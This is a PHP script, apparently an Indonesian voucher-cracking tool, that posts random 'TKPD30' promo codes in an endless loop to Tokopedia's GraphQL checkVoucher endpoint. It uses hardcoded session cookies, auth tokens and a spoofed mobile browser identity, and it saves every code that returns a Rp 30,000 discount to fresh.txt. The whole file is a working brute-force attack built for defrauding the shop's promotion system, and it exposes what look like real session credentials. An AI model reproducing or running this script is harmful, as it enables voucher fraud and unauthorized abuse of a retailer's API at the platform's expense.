<?php
 $file = fopen('fresh.txt','a');
function headerb($token,$body)
{
$headers = array();
$headers[] = 'Host: gql.tokopedia.com';
$headers[] = 'Content-Length:'. strlen($body);
$headers[] = 'Accept: */*';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://www.tokopedia.com';
$headers[] = 'X-Requested-With: mark.via.gp';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://www.tokopedia.com/pulsa';
$headers[] = 'Accept-Encoding: gzip, deflate';
$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'cookie: bm_mi=9D9F0846DD63437FDB83993652FDC710~BQ97HAOrO0PgVDWZyCjF5GvWJFvvFr61cpTSTtxD/GpzhNdMPRngZ8sHkNB6FlhwwpTU5shUHOD1Ag5CXO/Bv4snpE9JPxLqnucSrtI/SA9cSoe8Zuirq6sHG+EX91Z45LpNaQRZ5SXMjrsF68SDvOjjV/a2DlyjWVa7ZKC0qPlyLzKvJAcnjl4LwVyc/NAosqTrkjmK+kee+O04hZNJJbB5baTJVlgdON+VSQZQo7SY5L6M1v9FnwmFnJvQAoycX4/sNpq3+Kt0+kYc83rtmg==';
$headers[] = 'cookie: bm_sz=25362055E7067FCC34E34C404E27CCB6~YAAQfawXAs3lrZh1AQAAWYMhwAlJOhx1MmHY4O94CCcDyiuo32CBe5SD0uMsm0bZHxc5QQlKuE6Sl5L3dhB0vTWACAkr29xAUN6me8x6qX1Dg6e3I5HBSsV9tWKcP9GKeg5a7cQtsCEyiA4CHBTHwWear/dLSL+AziXIe4ewSumNt7jQPQQnOnra9oqiPKKp+JLq';
$headers[] = 'cookie: ak_bmsc=F35D8DA1A000F0DD49763B673C3830450217AC7DB17300000F1DAE5FAF09A74E~pl0cniU2UeaWb2YPz10xBIZOS64bcQ5GocgT9WVnTVmssNX61r4l6IHgYyDo7sYTUjwjC3uBpvvvj1pl/jB44YOdge3QNO4A8PF0oVI2rYWNV6mHWBWBS2M6B16ulrHAYxsajDQGcYwKmb2j8vxZnBdDXZDoIsYwrNwD7YPquT74FguUoThHjN/EUloQNvL7BboqGhQmRMyc7NUQH9VxydnpQ8PvmKxnGzfmiKjU22ziPLm4uuv9VGKogLjXFUY/+D';
$headers[] = 'cookie: DID=79dbb91aeb39260448822245252995164ac32c0cfbf66a59130e02436ecab67a1118f8b05eae09bfce346277005559d4';
$headers[] = 'cookie: __asc=7528ca26175c021baf765395732';
$headers[] = 'DID_JS=NzlkYmI5MWFlYjM5MjYwNDQ4ODIyMjQ1MjUyOTk1MTY0YWMzMmMwY2ZiZjY2YTU5MTMwZTAyNDM2ZWNhYjY3YTExMThmOGIwNWVhZTA5YmZjZTM0NjI3NzAwNTU1OWQ047DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=';
$headers[] = 'cookie: __asc=98c569a9175bd6efd73e3ae4523';
$headers[] = 'cookie: __auc=7528ca26175c021baf765395732';
$headers[] = 'cookie: _SID_Tokopedia_=0huBIBSntv1VxVQNyfvLkSl2vmFv-R3q3fAtr8q-fA2HP1hkfB9rNpdj4SQ6fwchwKAA3-dwH4C0x9DZGkviEQZUb_B7ljh_R1_AbTvImRsaki_dpwEcIzZwzlBznKe7';
$headers[] = 'cookie: l=1';
$headers[] = 'cookie: _abck=2B46AB86CC1BBBE6BFEA0BB62BE63F5D~0~YAAQhKwXAh+OYJx1AQAAn1AkwASOYGSaqXwpIqNPobC8XATyenfvjm95ArTt8IgQP4I9i7NtxfGDIS3/NZTREgVoWJYjzepBQESaogq+UBtgznTGctLYGFb0+OFWb9AGUDqzrEccFzQxY0U+WB/GTRSjxHCyPOv6NxXE4FoDuYkNe6j6skP1ecnMYtNpxNLqVlu8piCb/U6fUM8ewjXivkjNzDAz7fKGHo7sm72K8SWbsYfiYmMefSMVeAprFOVua+SiDBIpAJuhFQghE7XLCEKb7LPyXP5cwpblDRhaE8HK+t6ISDE2z1AE5V33Zn3K2EGsaf3iHU9sZ+xVYCc2Ab/9puys/Ah9ZQ==~-1~-1~-1';
$headers[] = 'cookie: tuid=71635939';
$headers[] = 'cookie: aus=1';
$headers[] = 'cookie: tuid=128286143';
$headers[] = 'cookie: _hjTLDTest=1';
$headers[] = 'cookie: _hjid=4c72a558-5b90-44d1-8739-1aef209a85e1';
$headers[] = 'cookie: _hjFirstSeen=1';
$headers[] = 'cookie: _hjAbsoluteSessionInProgress=0';
$headers[] = 'cookie: TOPRTK=FRJvTLtWRWWSwADqcvzi0A';
$headers[] = 'cookie: TOPATK=FYM5EBHjRWGyIxUE9wNspg';
$headers[] = 'cookie: bm_sv=C58254DB2F4EAB90740EAE9827CA5534~fuRkuFcK/NeqGm8Iu7D05YA1EfLfX1fRQoSDBHuS9XCRyA7uUdpxytjmuU0UAFEBXGoO9feqkJ/WobASMtGem77drMfjh4p4IHOKk6j93R50cti4gbgYNUy9GvVZzGdCYNu2XX2uz1bKAsRm3fnKznOy+UcLhPbM+Uqgesd3ehk=';
return $headers;
}
function net($body,$headers,$path)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://gql.tokopedia.com/' . $path);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
curl_setopt($ch, CURLOPT_COOKIE, "cookie.txt");
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
return $result;
}
while (true)
{
$rand = '012345678JAODTVEOCPNQRSOM';
$voc = substr(str_shuffle($rand), 0, 4);
$body = '{"operationName":"checkVoucher","variables":{"voucher":{"code":"TKPD30'.$voc.'","product_id":747}},"query":"query checkVoucher($voucher: RechargeInputVoucher!) {\n  rechargeCheckVoucher(voucher: $voucher) {\n    data {\n      success\n      code\n      promo_code_id\n      discountAmount: discount_amount\n      cashbackAmount: cashback_amount\n      saldo_amount\n      cashback_top_cash_amount\n      cashback_voucher_amount\n      titleDescription: title_description\n      invoice_description\n      gateway_id\n      promo_id\n      is_coupon\n      message {\n        state\n        color\n        text\n        __typename\n      }\n      __typename\n    }\n    errors {\n      status\n      title\n      __typename\n    }\n    __typename\n  }\n}\n"}';
$headers = headerb($cookie,$body);
$result = net($body,$headers,'graphql');
$result = json_decode($result,true);
$sleep (2);
echo "Kode : ". $result['data']['rechargeCheckVoucher']['data']['code'] . "\r\n";
$if = $result['data']['rechargeCheckVoucher']['data']['message']['text'];
$kode = $result['data']['rechargeCheckVoucher']['data']['code'];
if($if == "Anda mendapatkan Diskon Rp 30.000"){
echo "[*] Tersimpan di file fresh.txt gan". "\r\n";
fputs($file,"$kode" . "\r\n");
}else{
echo  "[*] Kode promo yang kamu masukkan salah." . "\r\n";
}
}?>
